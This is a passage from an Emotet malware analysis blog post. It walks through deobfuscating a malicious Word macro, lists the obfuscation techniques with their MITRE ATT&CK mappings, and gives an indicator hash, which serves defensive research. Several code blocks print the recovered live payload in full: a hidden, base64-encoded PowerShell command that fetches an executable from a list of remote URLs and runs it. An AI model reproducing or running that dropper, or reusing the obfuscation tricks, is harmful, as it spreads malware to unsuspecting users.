<pre><code>47. <strong>Ysjchbkkg</strong> = Join(("Po","w","e","r","s","h","el","l"," ","-","w"," ","h","id","d","e","n"," ","-","e","n JABBAH","oAeQB0","AGoAaA","B6AGcA","YQB1AG","0AaQBn","AD0AJw","BOAHYA","eABkAH","gAZwBj","AGMAYg","BuAGcA","JwA7AC","QATgBu","AHkAag","B0AGgA","YwByAH","oAagBv","AHkAdg","AgAD0A","IAAnAD","kAMwA3","ACcAOw","AkAEkA","aQBxAH","MAZgBw","AHMAbQ","A9ACcA","UgBvAG","cAeABw","AGcAeQ","B2AGUA","JwA7AC","QARQBr","AHgAaA","BsAG8A","YgBxAH","IAbABo","AD0AJA","BlAG4A","dgA6AH","UAcwBl","AHIAcA","ByAG8A","ZgBpAG","wAZQAr","ACcAXA","AnACsA","JABOAG","4AeQBq","AHQAaA","BjAHIA","egBqAG","8AeQB2","ACsAJw","AuAGUA","eABlAC","cAOwAk","AFMAYg","ByAHkA","cAB5AH","cAeABn","AGMAaQ","B0AGYA","PQAnAF","cAcABh","AHcAeQ","BiAGkA","cQBtAG","oAJwA7","ACQASA","BpAHIA","bQB5AG","gAcQBh","AGwAdA","BvAHMA","PQAmAC","gAJwBu","AGUAdw","AtAG8A","JwArAC","cAYgBq","ACcAKw","AnAGUA","YwB0AC","cAKQAg","AE4AZQ","BUAC4A","VwBlAE","IAQwBM","AGkARQ","BuAFQA","OwAkAF","IAeABi","AHkAdw","BpAGMA","aQA9AC","cAaAB0","AHQAcA","A6AC8A","LwBhAG","gAYwAu","AG0Acg","BiAGQA","ZQB2AC","4AYwBv","AG0ALw","B3AHAA","LQBhAG","QAbQBp","AG4ALw","BxAHAA","MAAvAC","oAaAB0","AHQAcA","A6AC8A","LwBlAC","0AdAB3","AG8Adw","AuAGIA","ZQAvAH","YAZQBy","AGQAZQ","AvAGkA","bgA2AG","sALwAq","AGgAdA","B0AHAA","cwA6AC","8ALwBt","AGEAZw","BuAGkA","ZgBpAG","MAZQBu","AHQAcA","BhAGsA","aQBzAH","QAYQBu","AC4AYw","BvAG0A","LwB3AH","AALQBp","AG4AYw","BsAHUA","ZABlAH","MALwBo","AGEANQ","BqADAA","YgAxAC","8AKgBo","AHQAdA","BwAHMA","OgAvAC","8AdwB3","AHcALg","BxAHcA","cQBvAG","8ALgBj","AG8AbQ","AvAGgA","bwBtAG","wAZAB3","AC8AMw","BwAGkA","eQB5AD","QALwAq","AGgAdA","B0AHAA","OgAvAC","8AcwBp","AHcAYQ","BrAHUA","cABvAH","MAbwAu","AGMAbw","BtAC8A","cwBpAH","cAYQBr","AHUAMg","AvAFgA","NQB6AE","IAMABl","AHkALw","AnAC4A","IgBzAH","AATABg","AGkAVA","AiACgA","WwBjAG","gAYQBy","AF0ANA","AyACkA","OwAkAE","4AdQBv","AGwAdA","B3AGYA","cQBoAD","0AJwBR","AHIAdg","BvAGgA","ZABpAH","UAYgBm","AGUAaw","AnADsA","ZgBvAH","IAZQBh","AGMAaA","AoACQA","TgBkAG","wAdQBh","AGwAdQ","B2ACAA","aQBuAC","AAJABS","AHgAYg","B5AHcA","aQBjAG","kAKQB7","AHQAcg","B5AHsA","JABIAG","kAcgBt","AHkAaA","BxAGEA","bAB0AG","8AcwAu","ACIARA","BvAHcA","YABOAG","wAbwBh","AGQAZg","BpAGAA","TABFAC","IAKAAk","AE4AZA","BsAHUA","YQBsAH","UAdgAs","ACAAJA","BFAGsA","eABoAG","wAbwBi","AHEAcg","BsAGgA","KQA7AC","QASABr","AHUAaw","BrAGYA","bwBwAH","QAagBk","AHIAPQ","AnAFgA","YQBiAG","QAeAB2","AGsAZg","BjAG0A","YQAnAD","sASQBm","ACAAKA","AoACYA","KAAnAE","cAZQB0","AC0ASQ","AnACsA","JwB0AG","UAbQAn","ACkAIA","AkAEUA","awB4AG","gAbABv","AGIAcQ","ByAGwA","aAApAC","4AIgBM","AGAAZQ","BuAGcA","YABUAE","gAIgAg","AC0AZw","BlACAA","MgA5AD","kAMwA2","ACkAIA","B7AFsA","RABpAG","EAZwBu","AG8Acw","B0AGkA","YwBzAC","4AUABy","AG8AYw","BlAHMA","cwBdAD","oAOgAi","AHMAYA","BUAEEA","UgB0AC","IAKAAk","AEUAaw","B4AGgA","bABvAG","IAcQBy","AGwAaA","ApADsA","JABZAH","oAagBq","AGYAcA","BsAG0A","awBnAH","gAPQAn","AEIAeA","BsAGsA","cQBtAH","QAeABh","ACcAOw","BiAHIA","ZQBhAG","sAOwAk","AE0Abw","BsAGMA","aABpAG","oAeAA9","ACcAUQ","B1AGEA","dABsAG","IAZABs","AHEAdg","BmAGQA","cAAnAH","0AfQBj","AGEAdA","BjAGgA","ewB9AH","0AJABS","AGMAaw","BhAGoA","cgB4AH","YAaQA9","ACcARQ","BqAGUA","YwB3AG","EAcgBn","AGsAYw","BsACcA", "",""))</code></pre>
<p>Let's join the substrings:</p>
<pre><code>48. <strong>Ysjchbkkg</strong> = "Powershell -w hidden -en JABBAHoAeQB0AGoAaAB6AGcAYQB1AG0AaQBnAD0AJwBOAHYAeABkAHgAZwBjAGMAYgBuAGcAJwA7ACQATgBuAHkAagB0AGgAYwByAHoAagBvAHkAdgAgAD0AIAAnADkAMwA3ACcAOwAkAEkAaQBxAHMAZgBwAHMAbQA9ACcAUgBvAGcAeABwAGcAeQB2AGUAJwA7ACQARQBrAHgAaABsAG8AYgBxAHIAbABoAD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACcAXAAnACsAJABOAG4AeQBqAHQAaABjAHIAegBqAG8AeQB2ACsAJwAuAGUAeABlACcAOwAkAFMAYgByAHkAcAB5AHcAeABnAGMAaQB0AGYAPQAnAFcAcABhAHcAeQBiAGkAcQBtAGoAJwA7ACQASABpAHIAbQB5AGgAcQBhAGwAdABvAHMAPQAmACgAJwBuAGUAdwAtAG8AJwArACcAYgBqACcAKwAnAGUAYwB0ACcAKQAgAE4AZQBUAC4AVwBlAEIAQwBMAGkARQBuAFQAOwAkAFIAeABiAHkAdwBpAGMAaQA9ACcAaAB0AHQAcAA6AC8ALwBhAGgAYwAuAG0AcgBiAGQAZQB2AC4AYwBvAG0ALwB3AHAALQBhAGQAbQBpAG4ALwBxAHAAMAAvACoAaAB0AHQAcAA6AC8ALwBlAC0AdAB3AG8AdwAuAGIAZQAvAHYAZQByAGQAZQAvAGkAbgA2AGsALwAqAGgAdAB0AHAAcwA6AC8ALwBtAGEAZwBuAGkAZgBpAGMAZQBuAHQAcABhAGsAaQBzAHQAYQBuAC4AYwBvAG0ALwB3AHAALQBpAG4AYwBsAHUAZABlAHMALwBoAGEANQBqADAAYgAxAC8AKgBoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBxAHcAcQBvAG8ALgBjAG8AbQAvAGgAbwBtAGwAZAB3AC8AMwBwAGkAeQB5ADQALwAqAGgAdAB0AHAAOgAvAC8AcwBpAHcAYQBrAHUAcABvAHMAbwAuAGMAbwBtAC8AcwBpAHcAYQBrAHUAMgAvAFgANQB6AEIAMABlAHkALwAnAC4AIgBzAHAATABgAGkAVAAiACgAWwBjAGgAYQByAF0ANAAyACkAOwAkAE4AdQBvAGwAdAB3AGYAcQBoAD0AJwBRAHIAdgBvAGgAZABpAHUAYgBmAGUAawAnADsAZgBvAHIAZQBhAGMAaAAoACQATgBkAGwAdQBhAGwAdQB2ACAAaQBuACAAJABSAHgAYgB5AHcAaQBjAGkAKQB7AHQAcgB5AHsAJABIAGkAcgBtAHkAaABxAGEAbAB0AG8AcwAuACIARABvAHcAYABOAGwAbwBhAGQAZgBpAGAATABFACIAKAAkAE4AZABsAHUAYQBsAHUAdgAsACAAJABFAGsAeABoAGwAbwBiAHEAcgBsAGgAKQA7ACQASABrAHUAawBrAGYAbwBwAHQAagBkAHIAPQAnAFgAYQBiAGQAeAB2AGsAZgBjAG0AYQAnADsASQBmACAAKAAoACYAKAAnAEcAZQB0AC0ASQAnACsAJwB0AGUAbQAnACkAIAAkAEUAawB4AGgAbABvAGIAcQByAGwAaAApAC4AIgBMAGAAZQBuAGcAYABUAEgAIgAgAC0AZwBlACAAMgA5ADkAMwA2ACkAIAB7AFsARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgAiAHMAYABUAEEAUgB0ACIAKAAkAEUAawB4AGgAbABvAGIAcQByAGwAaAApADsAJABZAHoAagBqAGYAcABsAG0AawBnAHgAPQAnAEIAeABsAGsAcQBtAHQAeABhACcAOwBiAHIAZQBhAGsAOwAkAE0AbwBsAGMAaABpAGoAeAA9ACcAUQB1AGEAdABsAGIAZABsAHEAdgBmAGQAcAAnAH0AfQBjAGEAdABjAGgAewB9AH0AJABSAGMAawBhAGoAcgB4AHYAaQA9ACcARQBqAGUAYwB3AGEAcgBnAGsAYwBsACcA")</code></pre>
<p>There is a PowerShell script in the <code>Ysjchbkkg</code> variable. Powershell ( <code> <a href="https://attack.mitre.org/techniques/T1086/" target="_blank" rel="noopener"> MITRE ATT&amp;CK T1086 </a> </code> <a href="https://attack.mitre.org/techniques/T1086/" target="_blank" rel="noopener"> ) </a> is commonly used by attackers to perform various actions, including downloading a file and execution of a code. The <code>-en</code> parameter in the PowerShell script is an alias of the <code>-EncodedCommand</code> parameter.</p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;">"- <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pwsh?view=powershell-7" target="_blank" rel="noopener"> EncodedCommand </a> " accepts a base64-encoded string version of a command.</div>
</blockquote>
<p>Therefore, we must use base64 decoding to reveal the PowerShell command. We'll analyze the obfuscated PowerShell command in the second part of this technical analysis series.</p>
<p>Now, we know the value of the <code>Ysjchbkkg</code> variable <strong>.</strong> Let's remember our main operation:</p>
<pre><code>4. Do While <strong>Fcbxktofsye</strong>.Create(<strong>er</strong> &amp; <strong>Ysjchbkkg</strong>, <strong>Swdtudgkjzjs</strong>, <strong>Awzttocpmk</strong>, <strong>Dzzebvtpbu</strong>)
Loop</code></pre>
<p>Until now, we revealed <code>Fcbxktofsye</code> , <code>er</code> , and <code>Ysjchbkkg</code> variables <em>.</em> Now, we must find <code>Swdtudgkjzjs</code> <em>,</em> <code>Awzttocpmk</code> and <code>Dzzebvtpbu</code> variables.</p>
<p><code>Swdtudgkjzjs</code> is uninitialized.</p>
<figure><img style="width: 1264px;" src="https://www.picussecurity.com/hubfs/Imported_Blog_Media/img4.png" alt="Image" title="Image"></figure>
<pre><code>49. <strong>Swdtudgkjzjs</strong> = ""</code></pre>
<p><code>Awzttocpmk</code> exists in the macro codes:</p>
<pre><code>50. Set <strong>Awzttocpmk</strong> = GetObject(<strong>Ybdakolbjc</strong>)</code></pre>
<pre><code>51. <strong>Ybdakolbjc</strong> = <strong>Ixldqggmg</strong> +<strong> Dtcqcidgf.Ekrdfjzpyjnsx</strong></code></pre>
<p>Let's put <mark>51.</mark> in place of <code>Ybdakolbjc</code> in <mark>50</mark> ., we get:</p>
<pre><code>52. Set <strong>Awzttocpmk</strong> = GetObject(<strong>YIxldqggmg</strong> + <strong>Dtcqcidgf.Ekrdfjzpyjnsx)</strong></code></pre>
<p>We found <code>Dtcqcidgf.Ekrdfjzpyjnsx</code> before:</p>
<pre><code>13. <strong>Dtcqcidgf.Ekrdfjzpyjnsx</strong> = "P"</code></pre>
<p>Let's get <code>Ixldqggmg</code> from the macro codes:</p>
<pre><code>53. <strong>Ixldqggmg</strong> = <strong>Dlgwrtobrxjmm</strong> + <strong>ChrW(wdKeyS)</strong> + <strong>Dtcqcidgf.Hsinculclm.Tag</strong> + <strong>Rpkdwysvusev</strong></code></pre>
<p>We need <code>Dlgwrtobrxjmmi</code> , <code>ChrW(wdKeyS)</code> , <code>Dtcqcidgf.Hsinculclm.Tag</code> and <code>Rpkdwysvusev</code> to find <code>Ixldqggmg</code> .</p>
<p>We've already revealed the value of <code>Dlgwrtobrxjmm</code> in <mark>22.</mark> :</p>
<pre><code>22. <strong>Dlgwrtobrxjmm</strong><em> = "</em>winmgmtS:win32_Process"</code></pre>
<p>We've also revealed <code>ChrW(wdKeyS)</code> in <code>12.</code> :</p>
<pre><code>12. <strong>ChrW(wdKeyS)</strong> = "S"</code></pre>
<p>Let's find <code>Dtcqcidgf.Hsinculclm.Tag</code> <em>.</em> We must look at data streams in forms instead of the macro codes.</p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;"><a href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/tag-property-example" target="_blank" rel="noopener"> Tag </a> is a property that stores additional information about each control on the forms. The default setting is a zero-length string (" ").</div>
</blockquote>
<p><code>Dtcqcidgf.Hsinculclm</code> is defined in the form variables in the document:</p>
<pre><code>54. <strong>Dtcqcidgf.Hsinculclm.Tag </strong>= "tar"</code></pre>
<p>Let's find <code>Rpkdwysvusev</code> <em>.</em> According to its name, it seems that it is in the macro codes.</p>
<pre><code>55. <strong>Rpkdwysvusev</strong> = <strong>Dtcqcidgf.Fshewmvxnlq.Tag</strong></code></pre>
<p>But, it is a tag property of a form variable, <code>Dtcqcidgf.Fshewmvxnlq</code> .</p>
<pre><code>56. <strong>Dtcqcidgf.Fshewmvxnlq.Tag = </strong>"tu"</code></pre>
<p>Therefore:</p>
<pre><code>57. <strong>Rpkdwysvusev</strong> = "tu"</code></pre>
<p>Let's put <mark>22.</mark> , <mark>12.</mark> , <mark>54.</mark> and <mark>57.</mark> in <mark>53.</mark> :</p>
<pre><code>58. <strong>Ixldqggmg</strong> = "winmgmtS:win32_Process" + "S" + "tar" + "tu"</code></pre>
<p>Get rid of "+" characters:</p>
<pre><code>59. <strong>Ixldqggmg</strong> = "winmgmtS:win32_ProcessStartu"</code></pre>
<p>Now, we now <code>Ixldqggmg</code> <strong>.</strong> Let's put <mark>59.</mark> and <mark>13.</mark> in <mark>52.</mark> :</p>
<pre><code>60. Set <strong>Awzttocpmk</strong> = GetObject("winmgmtS:win32_ProcessStartu" + "P")</code></pre>
<p>Therefore:</p>
<pre><code>61. Set <strong>Awzttocpmk</strong> = GetObject("winmgmtS:win32_ProcessStartuP")</code></pre>
<p>In the code <code>showwindow</code> property of <code>Awzttocpmk</code> is defined as <code>False</code> ( <code>Hidden Window,</code> <a href="https://attack.mitre.org/techniques/T1143/" target="_blank" rel="noopener"> <code>MITRE ATT&amp;CK T1143</code> </a> ):</p>
<pre><code>62. GetObject(winmgmtS:win32_processSp).showwindow = False</code></pre>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;"><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow" target="_blank" rel="noopener"> ShowWindow </a> function Sets the specified window's show state. The <code>False</code> value hides the window.</div>
</blockquote>
<p>Let's remember our main operation again.</p>
<pre><code>4. Do While <strong>Fcbxktofsye</strong>.Create(<strong>er</strong> &amp; <strong>Ysjchbkkg</strong>, <strong>Swdtudgkjzjs</strong>, <strong>Awzttocpmk</strong>, <strong>Dzzebvtpbu</strong>)
Loop</code></pre>
<p>We've found <code>Fcbxktofsye</code> <em>,</em> <code>er</code> <em>,</em> <code>Ysjchbkkg</code> <em>,</em> <code>Swdtudgkjzjs</code> and <code>Awzttocpmk</code> until now <em>.</em></p>
<p>Now, we must find <code>Dzzebvtpbu</code> variable, but it is uninitialized.</p>
<pre><code>63. <strong>Dzzebvtpbu</strong> = ""</code></pre>
<p>We revealed all variables. Let's remember them:</p>
<pre><code>23. Set <strong>Fcbxktofsye</strong> = GetObject(winmgmtS:win32_Process)</code></pre>
<pre><code>25. <strong>er</strong> = ""</code></pre>
<pre><code>48. <strong>Ysjchbkkg</strong> = "Powershell -w hidden -en JABBAHoAeQB0AGoAaAB6AGcAYQB1AG0AaQBnAD0AJwBOAHYAeABkAHgAZwBjAGMAYgBuAGcAJwA7ACQATgBuAHkAagB0AGgAYwByAHoAagBvAHkAdgAgAD0AIAAnADkAMwA3ACcAOwAkAEkAaQBxAHMAZgBwAHMAbQA9ACcAUgBvAGcAeABwAGcAeQB2AGUAJwA7ACQARQBrAHgAaABsAG8AYgBxAHIAbABoAD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACcAXAAnACsAJABOAG4AeQBqAHQAaABjAHIAegBqAG8AeQB2ACsAJwAuAGUAeABlACcAOwAkAFMAYgByAHkAcAB5AHcAeABnAGMAaQB0AGYAPQAnAFcAcABhAHcAeQBiAGkAcQBtAGoAJwA7ACQASABpAHIAbQB5AGgAcQBhAGwAdABvAHMAPQAmACgAJwBuAGUAdwAtAG8AJwArACcAYgBqACcAKwAnAGUAYwB0ACcAKQAgAE4AZQBUAC4AVwBlAEIAQwBMAGkARQBuAFQAOwAkAFIAeABiAHkAdwBpAGMAaQA9ACcAaAB0AHQAcAA6AC8ALwBhAGgAYwAuAG0AcgBiAGQAZQB2AC4AYwBvAG0ALwB3AHAALQBhAGQAbQBpAG4ALwBxAHAAMAAvACoAaAB0AHQAcAA6AC8ALwBlAC0AdAB3AG8AdwAuAGIAZQAvAHYAZQByAGQAZQAvAGkAbgA2AGsALwAqAGgAdAB0AHAAcwA6AC8ALwBtAGEAZwBuAGkAZgBpAGMAZQBuAHQAcABhAGsAaQBzAHQAYQBuAC4AYwBvAG0ALwB3AHAALQBpAG4AYwBsAHUAZABlAHMALwBoAGEANQBqADAAYgAxAC8AKgBoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBxAHcAcQBvAG8ALgBjAG8AbQAvAGgAbwBtAGwAZAB3AC8AMwBwAGkAeQB5ADQALwAqAGgAdAB0AHAAOgAvAC8AcwBpAHcAYQBrAHUAcABvAHMAbwAuAGMAbwBtAC8AcwBpAHcAYQBrAHUAMgAvAFgANQB6AEIAMABlAHkALwAnAC4AIgBzAHAATABgAGkAVAAiACgAWwBjAGgAYQByAF0ANAAyACkAOwAkAE4AdQBvAGwAdAB3AGYAcQBoAD0AJwBRAHIAdgBvAGgAZABpAHUAYgBmAGUAawAnADsAZgBvAHIAZQBhAGMAaAAoACQATgBkAGwAdQBhAGwAdQB2ACAAaQBuACAAJABSAHgAYgB5AHcAaQBjAGkAKQB7AHQAcgB5AHsAJABIAGkAcgBtAHkAaABxAGEAbAB0AG8AcwAuACIARABvAHcAYABOAGwAbwBhAGQAZgBpAGAATABFACIAKAAkAE4AZABsAHUAYQBsAHUAdgAsACAAJABFAGsAeABoAGwAbwBiAHEAcgBsAGgAKQA7ACQASABrAHUAawBrAGYAbwBwAHQAagBkAHIAPQAnAFgAYQBiAGQAeAB2AGsAZgBjAG0AYQAnADsASQBmACAAKAAoACYAKAAnAEcAZQB0AC0ASQAnACsAJwB0AGUAbQAnACkAIAAkAEUAawB4AGgAbABvAGIAcQByAGwAaAApAC4AIgBMAGAAZQBuAGcAYABUAEgAIgAgAC0AZwBlACAAMgA5ADkAMwA2ACkAIAB7AFsARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgAiAHMAYABUAEEAUgB0ACIAKAAkAEUAawB4AGgAbABvAGIAcQByAGwAaAApADsAJABZAHoAagBqAGYAcABsAG0AawBnAHgAPQAnAEIAeABsAGsAcQBtAHQAeABhACcAOwBiAHIAZQBhAGsAOwAkAE0AbwBsAGMAaABpAGoAeAA9ACcAUQB1AGEAdABsAGIAZABsAHEAdgBmAGQAcAAnAH0AfQBjAGEAdABjAGgAewB9AH0AJABSAGMAawBhAGoAcgB4AHYAaQA9ACcARQBqAGUAYwB3AGEAcgBnAGsAYwBsACcA")</code></pre>
<pre><code>49. <strong>Swdtudgkjzjs</strong> = ""</code></pre>
<pre><code>61. Set <strong>Awzttocpmk</strong> = GetObject("winmgmtS:win32_ProcessStartuP")</code></pre>
<p>Let's put <mark>23.,</mark> <mark>25.</mark> , <mark>48.</mark> , <mark>49.</mark> , <mark>61.</mark> , and <mark>63.</mark> in their places in <mark>4</mark> :</p>
<pre><code>52. Do While GetObject(winmgmtS:win32_Process).Create("" &amp; "Powershell -w hidden -en JABBAHoAeQB0AGoAaAB6AGcAYQB1AG0AaQBnAD0AJwBOAHYAeABkAHgAZwBjAGMAYgBuAGcAJwA7ACQATgBuAHkAagB0AGgAYwByAHoAagBvAHkAdgAgAD0AIAAnADkAMwA3ACcAOwAkAEkAaQBxAHMAZgBwAHMAbQA9ACcAUgBvAGcAeABwAGcAeQB2AGUAJwA7ACQARQBrAHgAaABsAG8AYgBxAHIAbABoAD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACcAXAAnACsAJABOAG4AeQBqAHQAaABjAHIAegBqAG8AeQB2ACsAJwAuAGUAeABlACcAOwAkAFMAYgByAHkAcAB5AHcAeABnAGMAaQB0AGYAPQAnAFcAcABhAHcAeQBiAGkAcQBtAGoAJwA7ACQASABpAHIAbQB5AGgAcQBhAGwAdABvAHMAPQAmACgAJwBuAGUAdwAtAG8AJwArACcAYgBqACcAKwAnAGUAYwB0ACcAKQAgAE4AZQBUAC4AVwBlAEIAQwBMAGkARQBuAFQAOwAkAFIAeABiAHkAdwBpAGMAaQA9ACcAaAB0AHQAcAA6AC8ALwBhAGgAYwAuAG0AcgBiAGQAZQB2AC4AYwBvAG0ALwB3AHAALQBhAGQAbQBpAG4ALwBxAHAAMAAvACoAaAB0AHQAcAA6AC8ALwBlAC0AdAB3AG8AdwAuAGIAZQAvAHYAZQByAGQAZQAvAGkAbgA2AGsALwAqAGgAdAB0AHAAcwA6AC8ALwBtAGEAZwBuAGkAZgBpAGMAZQBuAHQAcABhAGsAaQBzAHQAYQBuAC4AYwBvAG0ALwB3AHAALQBpAG4AYwBsAHUAZABlAHMALwBoAGEANQBqADAAYgAxAC8AKgBoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBxAHcAcQBvAG8ALgBjAG8AbQAvAGgAbwBtAGwAZAB3AC8AMwBwAGkAeQB5ADQALwAqAGgAdAB0AHAAOgAvAC8AcwBpAHcAYQBrAHUAcABvAHMAbwAuAGMAbwBtAC8AcwBpAHcAYQBrAHUAMgAvAFgANQB6AEIAMABlAHkALwAnAC4AIgBzAHAATABgAGkAVAAiACgAWwBjAGgAYQByAF0ANAAyACkAOwAkAE4AdQBvAGwAdAB3AGYAcQBoAD0AJwBRAHIAdgBvAGgAZABpAHUAYgBmAGUAawAnADsAZgBvAHIAZQBhAGMAaAAoACQATgBkAGwAdQBhAGwAdQB2ACAAaQBuACAAJABSAHgAYgB5AHcAaQBjAGkAKQB7AHQAcgB5AHsAJABIAGkAcgBtAHkAaABxAGEAbAB0AG8AcwAuACIARABvAHcAYABOAGwAbwBhAGQAZgBpAGAATABFACIAKAAkAE4AZABsAHUAYQBsAHUAdgAsACAAJABFAGsAeABoAGwAbwBiAHEAcgBsAGgAKQA7ACQASABrAHUAawBrAGYAbwBwAHQAagBkAHIAPQAnAFgAYQBiAGQAeAB2AGsAZgBjAG0AYQAnADsASQBmACAAKAAoACYAKAAnAEcAZQB0AC0ASQAnACsAJwB0AGUAbQAnACkAIAAkAEUAawB4AGgAbABvAGIAcQByAGwAaAApAC4AIgBMAGAAZQBuAGcAYABUAEgAIgAgAC0AZwBlACAAMgA5ADkAMwA2ACkAIAB7AFsARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgAiAHMAYABUAEEAUgB0ACIAKAAkAEUAawB4AGgAbABvAGIAcQByAGwAaAApADsAJABZAHoAagBqAGYAcABsAG0AawBnAHgAPQAnAEIAeABsAGsAcQBtAHQAeABhACcAOwBiAHIAZQBhAGsAOwAkAE0AbwBsAGMAaABpAGoAeAA9ACcAUQB1AGEAdABsAGIAZABsAHEAdgBmAGQAcAAnAH0AfQBjAGEAdABjAGgAewB9AH0AJABSAGMAawBhAGoAcgB4AHYAaQA9ACcARQBqAGUAYwB3AGEAcgBnAGsAYwBsACcA","",GetObject("winmgmtS:win32_ProcessStartuP"),"")
Loop</code></pre>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;"><a href="https://docs.microsoft.com/en-us//dotnet/visual-basic/language-reference/operators/concatenation-operator" target="_blank" rel="noopener"> <code>&amp;</code> </a> operator generates a string concatenation of two expressions.</div>
</blockquote>
<p>In this <code>Do While</code> loop, <code>Create</code> method of the <code>Win32_Process</code> class is used.</p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;">The <strong>Create</strong> <a href="https://docs.microsoft.com/windows/desktop/WmiSdk/retrieving-a-class" target="_blank" rel="noopener"> WMI class </a> method creates a new process.</div>
</blockquote>
<p>Syntax:</p>
<pre><code>uint32 Create(
  [in]  string               CommandLine,
  [in]  string               CurrentDirectory,
  [in]  Win32_ProcessStartup ProcessStartupInformation,
  [out] uint32               ProcessId
);</code></pre>
<p>Therefore, the first variable is the command line to execute. It is a PowerShell command in this code.</p>
<p>The second variable is CurrentDirectory. If this parameter is NULL as in this code, the new process will have the same path as the calling process.</p>
<p>The third variable is ProcessStartupInformation, like <code>winmgmtS:win32_ProcessStartuP</code> in this example.</p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;">The <a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-processstartup" target="_blank" rel="noopener"> <code>Win32_ProcessStartup</code> </a> abstract WMI class represents the startup configuration of a Windows-based process. The class is defined as a method type definition, which means that it is only used for passing information to the Create method of the Win32_Process class.</div>
</blockquote>
<p>The last variable is the global process identifier that can be used to identify a process.</p>
<h2>Summary</h2>
<p>The purpose of this document, as the first part of the Emotet Technical Analysis Series is to demonstrate how to reveal heavily obfuscated Visual Basic macro codes in a recent Emotet malware document. <strong> Briefly, this obfuscated VBA code embedded in the Word document executes a PowerShell command using VMI. </strong></p>
<p>So far, adversaries used the following techniques to obfuscate VBA codes in the analyzed document:</p>
<ol start="1">
<li>Using hundreds of never-used loops, declarations, conditions, type conversions, and variable assignments.</li>
</ol>
<ol start="2">
<li>Using empty macros.</li>
</ol>
<ol start="3">
<li>Inserting many instances of a string ( <code>=mmuusns=</code> ) to the content of several variables.</li>
</ol>
<ol start="4">
<li><code>ShowWindow</code> property is set to <code>False</code> to hide the created process appearing on the user's task bar.</li>
</ol>
<ol start="5">
<li>Hiding some variables in <code>User Forms</code> , instead of putting them in the macro codes.</li>
</ol>
<ol start="6">
<li>Hiding some variables in properties of form variables such as <code>Tag</code> and <code>GroupName</code> properties.</li>
</ol>
<ol start="7">
<li>Using <code>Split</code> function to split a string to its substrings by a given delimiter ( <code>=mmuusns=</code> ). The delimiter is the random string used before.</li>
</ol>
<ol start="8">
<li>Joining substrings to create the original string by the <code>Join</code> function.</li>
</ol>
<ol start="9">
<li>Concatenating strings with <code>+</code> and <code>&amp;</code> operators.</li>
</ol>
<ol start="10">
<li>Using alternating case strings like <code>winmgmtS:win32_ProcessStartuP</code> to bypass simple case-sensitive filters.</li>
</ol>
<ol start="11">
<li>Using <code>ChrW</code> conversion and <code>wdKey enumeration</code> such as <code>wdKeyS</code> to obfuscate characters.</li>
</ol>
<ol start="12">
<li>Using <code>WMI</code> to create a process instead of <code>cmd</code> . If WMI activity is not monitored, it is hard to detect creation of the malicious process. However, if WMI activity is monitored, WMI process creation gives blue teams a strong signal to investigate further since it is not something commonly seen in business processes.</li>
</ol>
<ol start="13">
<li>Using uninitialized variables as the <code>Null</code> character.</li>
</ol>
<ol start="15">
<li>Adding dozens of space characters to variables. Then, the <code>Trim</code> function is used to strip leading and trailing strings.</li>
<li>Using useless functions, such as the <code>CVar</code> type conversion function.</li>
</ol>
<p><strong> We will analyze and reveal behaviors of the PowerShell command in the second part of this Emotet Technical Analysis series. </strong></p>
<h3><strong>MITRE’s ATT&amp;CK Techniques Observed</strong></h3>
<div>
<h4><!--&nbsp;--></h4>
<table style="font-size: 20px;">
<thead>
<tr>
<th>Initial Access</th>
<th>Execution</th>
<th>Defense Evasion</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1192/" target="_blank" rel="noopener"> T1192 Spearphishing Link </a></td>
<td><a href="https://attack.mitre.org/techniques/T1059/" target="_blank" rel="noopener"> T1059 Command-Line Interface </a></td>
<td><a href="https://attack.mitre.org/techniques/T1140/" target="_blank" rel="noopener"> T1140 Deobfuscate/Decode Files or Information </a></td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1193/" target="_blank" rel="noopener"> T1193 Spearphishing Attachment </a></td>
<td><a href="https://attack.mitre.org/techniques/T1086/" target="_blank" rel="noopener"> T1086 PowerShell </a></td>
<td><a href="https://attack.mitre.org/techniques/T1143/" target="_blank" rel="noopener"> T1143 Hidden Windows </a></td>
</tr>
<tr>
<td>&nbsp;</td>
<td><a href="https://attack.mitre.org/techniques/T1064/" target="_blank" rel="noopener"> T1064 Scripting </a></td>
<td><a href="https://attack.mitre.org/techniques/T1064/" target="_blank" rel="noopener"> T1064 Scripting </a></td>
</tr>
<tr>
<td>&nbsp;</td>
<td><a href="https://attack.mitre.org/techniques/T1204/" target="_blank" rel="noopener"> T1204 User Execution </a></td>
<td>&nbsp;</td>
</tr>
<tr>
<td>&nbsp;</td>
<td><a href="https://attack.mitre.org/techniques/T1047/" target="_blank" rel="noopener"> T1047 Windows Management Instrumentation </a></td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
</div>
<h2><strong>Indicator of Compromises (IoCs)</strong></h2>
<h3>Delivery Documents</h3>
<pre><code>FF76FF1440947E3DD42578F534B91FDB8229C1F40FED36A3DD5688DBC51F0014</code></pre>
<h3>Emotet Executables</h3>
